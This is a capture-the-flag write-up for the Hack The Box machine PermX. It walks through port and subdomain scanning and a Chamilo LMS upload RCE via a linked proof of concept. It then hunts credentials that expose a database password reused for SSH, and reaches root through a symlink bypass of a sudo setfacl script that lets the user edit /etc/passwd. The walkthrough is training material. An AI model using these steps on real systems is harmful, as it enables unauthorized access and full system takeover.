---
description: https://app.hackthebox.com/machines/PermX
---

# PermX

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

## Port scanning

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: eLEARNING
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
```



## Subdomain scanning

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 145ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 227ms]
:: Progress: [4989/4989] :: Job [1/1] :: 280 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
```



## Web vuln

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

We see it's using `Chamilo` LMS, basic googling about it's recent vuln gives POC

[https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) \
POC LINK



## Shell&#x20;

### www-data

Follow the POC steps and get a reverse shell.

### www-data -> mtz

```bash
cd /var/www/chamilo && grep -irl "password"
```

This will list all files that contains `password` variable/text.

We will find `cli-config.php` where we see all imp variables,&#x20;

```php
<?php
/* For licensing terms, see /license.txt */

/**
 * Script needed to execute bin/doctrine.php in the command line
 * in order to:.
 *
 * - Generate migrations
 * - Create schema
 * - Update schema
 * - Validate schema
 * - Etc
 */
use Doctrine\ORM\Tools\Console\ConsoleRunner;

require_once __DIR__.'/vendor/autoload.php';
//require_once __DIR__.'/main/inc/lib/api.lib.php';
$configurationFile = __DIR__.'/app/config/configuration.php';

if (!is_file($configurationFile)) {
    echo "File does not exists: $configurationFile";
    exit();
}

require_once __DIR__.'/main/inc/global.inc.php';
require_once $configurationFile;

$database = new \Database();
$dbParams = [
    'driver' => 'pdo_mysql',
    'host' => $_configuration['db_host'],
    'user' => $_configuration['db_user'],
    'password' => $_configuration['db_password'],
    'dbname' => $_configuration['main_database'],
];

$database->connect($dbParams, realpath(__DIR__).'/', realpath(__DIR__).'/');
$entityManager = $database::getManager();

$helperSet = ConsoleRunner::createHelperSet($entityManager);
$dialogHelper = new Symfony\Component\Console\Helper\QuestionHelper();
$helperSet->set($dialogHelper);

return $helperSet;
```

out of which I found this useful

```php
$configurationFile = __DIR__.'/app/config/configuration.php';
```

#### configuration.php

```bash
www-data@permx:/var/www/chamilo$ cat ./app/config/configuration.php | grep password

$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Security word for password recovery

<--SNIPPED-->
```

Now we can ssh and be user `mtz`

Ohh btw, how I find user mtz??? Here's how :arrow\_down:

```bash
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

### mtz -> root

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

File content:

```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

What is setfacl?

{% embed url="https://www.geeksforgeeks.org/linux-setfacl-command-with-example/" %}

To sum it up, it's alternative of `chmod` with more extra features.

#### Exploit

How's the script working:

1. It checks if given file is under /home/mtz (so a normal user should not change other imp files)
2. The argument should not have `..` (it should stay under /home/mtz)
3. The given argument should be file

With given 3 rules, it's very easy to bypass this. **We wil create a symbolic link, under /home/mtz, so that we can edit different sources files too**

```bash
#created link
mtz@permx:~$ ln -s /etc/passwd /home/mtz/passwd

#modified permission
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd
mtz@permx:~$ ls -la /etc/passwd
-rw-rwxr--+ 1 root root 1874 Jul 13 10:48 /etc/passwd

mtz@permx:~$ ls -la passwd
lrwxrwxrwx 1 mtz mtz 11 Jul 13 10:45 passwd -> /etc/passwd

```

Now let's become root, i'll simply update my uid from `1000` to `0`

```bash
mtz@permx:~$ cat passwd
root:x:0:0:root:/root:/bin/bash

<--SNIPPED-->
mtz:x:0:0:mtz:/home/mtz:/bin/bash #<- here we changed our permission
<--SNIPPED->


#Now just login as mtz, and boom we are root
#You can also create new user and make that user root(uid 0).
mtz@permx:~$ su mtz
Password:
root@permx:~# id
uid=0(root) gid=0(root) groups=0(root),1000(mtz)
```

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption><p>Yay <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning....



